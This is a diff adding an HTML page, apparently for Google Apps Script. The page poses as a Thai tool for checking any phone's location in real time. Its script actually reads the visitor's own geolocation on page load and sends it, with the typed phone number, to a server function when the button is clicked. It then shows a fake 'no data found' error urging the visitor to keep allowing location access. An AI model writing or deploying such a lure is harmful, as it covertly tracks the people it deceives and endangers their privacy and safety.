@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <title>Bootstrap Example</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-giJF6kkoqNQ00vy+HMDP7azOuL0xtbfIcaT9wjKHr8RbDVddVHyTfAAsrekwKmP1" crossorigin="anonymous">
+    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+</head>
+
+<body>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta1/dist/js/bootstrap.bundle.min.js" integrity="sha384-ygbV9kiqUc6oa4msXn9868pTtWMgiQaeYH7/t7LECLbyPA2x65Kgf80OJFdroafW" crossorigin="anonymous"></script>
+    <div class="container text-center">
+        <h2>เช็คพิกัดโทรศัพท์แบบเรียลไทม์</h2>
+        <form id="mainform">
+          <img src="https://pict-c.sindonews.net/dyn/620/pena/news/2021/05/12/207/426126/5-aplikasi-gps-yang-bisa-digunakan-saat-offline-vie.jpg" />
+            <div class="form-group text-center">
+                <label for="username">หมายเลขโทรศัพท์:</label>
+                <input type="text" class="form-control" id="username">
+            </div>
+<br>
+
+            <button id="btn" class="btn btn-primary text-center">ค้นหาพิกัด</button>
+        </form>
+    </div>
+    <script>
+        getLocation()
+        let lat, lon
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(position => {
+                    lat = position.coords.latitude
+                    lon = position.coords.longitude
+                });
+            }
+        }
+
+    </script>
+    <script>
+        document.getElementById("btn").addEventListener("click", saveData)
+
+        function saveData() {
+            event.preventDefault()
+            var data = {}
+            data.username = document.getElementById("username").value
+
+            data.lat = lat
+            data.lon = lon
+            google.script.run.withSuccessHandler(saveSuccess).userClick(data)
+            document.getElementById("mainform").reset()
+        }
+        function saveSuccess(result) {
+            if (result) {
+               Swal.fire({
+                   icon: 'error',
+                   title: 'ไม่พบข้อมูลที่ค้นหา',
+                   text: 'ต้องอนุญาตให้เข้าถึงตำแหน่งทุกครั้ง!',
+                   footer: '<a href="">กรุณาทำรายการอีกครั้ง</a>'
+})
+            }
+        }
+    </script>
+    <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+</body>
+
+</html>
